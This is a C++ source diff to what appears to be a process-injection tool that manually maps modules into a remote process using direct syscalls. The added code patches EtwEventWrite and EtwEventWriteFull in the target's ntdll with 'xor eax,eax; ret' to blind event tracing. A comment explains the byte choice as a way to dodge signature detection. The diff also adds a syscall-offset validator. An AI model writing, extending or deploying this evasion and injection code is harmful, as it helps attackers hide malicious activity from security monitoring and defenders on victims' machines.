@@ -1,5 +1,6 @@
 #include "mm_executor.h"
 #include "syscalls.h"
+#include "win_offsets.h"
 #include "peb_walk.h"
 #include "manual_map.h"
 #include "loader_stub.h"
@@ -266,14 +267,61 @@ mm_status execute_remote(const mm_execute_request* request, std::wstring& error)
     status = enumerate_remote_modules(process.get(), remote_modules, error);
     if (status != MM_OK) return status;
 
-    // 4. Apply environment variables via shellcode.
+    // 4. Blind user-mode ETW in target process.
+    //    Patches EtwEventWrite with "xor eax,eax; ret" (returns STATUS_SUCCESS)
+    //    instead of a bare 0xC3, which is the most commonly signature-matched patch.
+    //    Only when "etw-blind" option is set. Skipped for self-injection.
+    {
+        bool etw_blind_requested = false;
+        for (uint32_t i = 0; i < request->option_count; ++i) {
+            if (to_wstring(request->options[i].name) == L"etw-blind")
+                etw_blind_requested = true;
+        }
+
+        NT_PROCESS_BASIC_INFORMATION etw_pbi{};
+        syscall::NtQueryInformationProcess(process.get(), 0, &etw_pbi, sizeof(etw_pbi), nullptr);
+        bool is_self = (static_cast<uint32_t>(etw_pbi.UniqueProcessId) == GetCurrentProcessId());
+
+        if (etw_blind_requested && !is_self) {
+            // Patch both EtwEventWrite and EtwEventWriteFull for complete coverage.
+            const char* etw_exports[] = { "EtwEventWrite", "EtwEventWriteFull" };
+            for (const auto& mod : remote_modules) {
+                if (_wcsicmp(mod.name.c_str(), L"ntdll.dll") != 0) continue;
+                for (const auto* export_name : etw_exports) {
+                    uintptr_t etw_addr = 0;
+                    std::wstring etw_err;
+                    if (resolve_remote_export(process.get(), mod.base, export_name,
+                                               etw_addr, remote_modules, etw_err) != MM_OK || !etw_addr)
+                        continue;
+                    PVOID patch_addr = reinterpret_cast<PVOID>(etw_addr);
+                    SIZE_T patch_region = 0x1000;
+                    ULONG old_prot = 0;
+                    auto pst = syscall::NtProtectVirtualMemory(process.get(), &patch_addr, &patch_region,
+                                                                PAGE_EXECUTE_READWRITE, &old_prot);
+                    if (NT_SUCCESS(pst)) {
+                        // xor eax, eax; ret → returns 0 (STATUS_SUCCESS).
+                        const uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
+                        syscall::NtWriteVirtualMemory(process.get(),
+                            reinterpret_cast<PVOID>(etw_addr), patch, sizeof(patch), nullptr);
+                        patch_addr = reinterpret_cast<PVOID>(etw_addr);
+                        patch_region = 0x1000;
+                        syscall::NtProtectVirtualMemory(process.get(), &patch_addr, &patch_region,
+                                                         old_prot, &old_prot);
+                    }
+                }
+                break;
+            }
+        }
+    }
+
+    // 5. Apply environment variables via shellcode.
     if (request->env_count > 0) {
         status = apply_environment_remote(process.get(), request, request->timeout_ms,
                                            remote_modules, error);
         if (status != MM_OK) return status;
     }
 
-    // 5. Manual-map each module in order.
+    // 6. Manual-map each module in order.
     std::vector<MappedModule> mapped_modules;
     for (uint32_t i = 0; i < request->module_count; ++i) {
         const auto module_path = to_wstring(request->modules[i]);
@@ -283,7 +331,7 @@ mm_status execute_remote(const mm_execute_request* request, std::wstring& error)
             break;
         }
 
-        status = manual_map_remote(process.get(), module_path, request->timeout_ms,
+        status = manual_map_remote(process.get(), request->pid, module_path, request->timeout_ms,
                                     remote_modules, mapped_modules, error);
         if (status != MM_OK) break;
     }
@@ -330,4 +378,39 @@ extern "C" mm_status MM_CALL mm_execute(
     const auto status = execute_remote(request, error);
     write_error(error, error_buffer, error_buffer_capacity, error_buffer_written);
     return status;
+}
+
+extern "C" int32_t MM_CALL mm_validate_offsets(
+    uint16_t* error_buffer,
+    uint32_t error_buffer_capacity,
+    uint32_t* error_buffer_written)
+{
+    // Force initialization if not already done.
+    if (!win_offsets().initialized) {
+        std::wstring init_error;
+        if (!syscall_init(init_error)) {
+            write_error(init_error, error_buffer, error_buffer_capacity, error_buffer_written);
+            return -1;
+        }
+    }
+
+    const auto& off = win_offsets();
+    int32_t result = 0;
+    if (!off.ssn_pattern_validated)    result |= 1;
+    if (!off.api_set_available)        result |= 2;
+    if (off.btt_call_addr == nullptr)  result |= 4;
+    if (off.ruts_call_addr == nullptr) result |= 8;
+    if (off.spi_unique_process_id == 0) result |= 16;
+
+    if (result != 0) {
+        std::wstring detail = L"Offset validation failures: ";
+        if (result & 1)  detail += L"SSN ";
+        if (result & 2)  detail += L"ApiSet ";
+        if (result & 4)  detail += L"BTT ";
+        if (result & 8)  detail += L"RUTS ";
+        if (result & 16) detail += L"SPI ";
+        write_error(detail, error_buffer, error_buffer_capacity, error_buffer_written);
+    }
+
+    return result;
 }
